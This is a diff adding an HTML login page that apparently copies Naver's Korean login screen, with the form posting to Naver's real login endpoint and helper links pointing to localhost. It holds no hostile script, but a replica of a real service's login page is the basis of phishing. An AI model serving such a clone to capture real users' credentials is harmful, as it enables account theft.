@@ -1,0 +1,74 @@
+
+<!-- 로그인 페이지 -->
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+	<meta charset="UTF-8">
+	<meta http-equiv="X-UA-Compatible" content="IE=edge">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, user-scalable=no">
+	<title>로그인</title>
+	<link rel="stylesheet" type="text/css" href="/login/css/global/desktop/w_20181218.css?dt=20181218">
+</head>
+<body class="chrome">
+<div id="wrap">
+	<!-- //header -->
+	<!-- container -->
+	<div id="container">
+		<!-- content -->
+		<div id="content">
+			<div class="title" aria-live="assertive">
+				<p></p>
+			</div>
+				<form id="frmNIDLogin" name="frmNIDLogin" target="_top" AUTOCOMPLETE="off" action="https://nid.naver.com/nidlogin.login" method="POST" onsubmit="return confirmSplitSubmit();">
+						<fieldset class="login_form">
+					<legend class="blind">로그인</legend>
+					<div class="id_area">
+						<div class="input_row" id="id_area">
+							<span class="input_box">
+								<label for="id" id="label_id_area" class="lbl">아이디</label>
+								<input type="text" id="id" name="id" accesskey="L" placeholder="아이디" class="int" maxlength="41" value="">
+							</span>
+							<button type="button" disabled="" title="delete" id="id_clear" class="wrg">삭제</button>
+						</div>
+						<div class="error" id="err_empty_id" style="display:none" aria-live="assertive"></div>
+					</div>
+					<div class="pw_area">
+						<div class="input_row" id="pw_area">
+							<span class="input_box">
+								<label for="pw" id="label_pw_area"  class="lbl">비밀번호</label>
+								<input type="password" id="pw" name="pw" placeholder="비밀번호" class="int" maxlength="16" onkeypress="capslockevt(event);getKeysv2();" onkeyup="checkShiftUp(event);" onkeydown="checkShiftDown(event);">
+							</span>
+							<button type="button" disabled="" title="delete" id="pw_clear" class="wrg">삭제</button>
+							<div class="ly_v2" id="err_capslock" style="display:none;">
+								<div class="ly_box">
+									<p><strong>Caps Lock</strong>이 켜져 있습니다.</p>
+								</div>
+								<span class="sp ly_point"></span>
+							</div>
+						</div>
+						<div class="error" id="err_empty_pw" style="display:none" aria-live="assertive"></div>
+					</div>
+					<input type="submit" title="로그인" alt="로그인" value="로그인" class="btn_global" onclick="nclks('log.login',this,event)">
+
+				</fieldset>
+			</form>
+			<div class="position_a">
+				<div class="find_info">
+					<a target="_blank" id="idinquiry" href="http://localhost:80/id">아이디/비밀번호 찾기</a><span class="bar" aria-hidden="true">|</span> <a target="_blank" id="join" href="http://localhost:80/signin">회원가입</a>
+				</div>
+			</div>
+		</div>
+		<!-- //content -->
+	</div>
+	<!-- //container -->
+	<!-- footer -->
+
+	<!-- //footer -->
+</div>
+<script type="text/javascript" src="/login/js/common.all.js?141216"> </script>
+<script type="text/javascript">
+
+</script>
+<div id="nv_stat" style="display:none;">20</div>
+</body>
+</html>
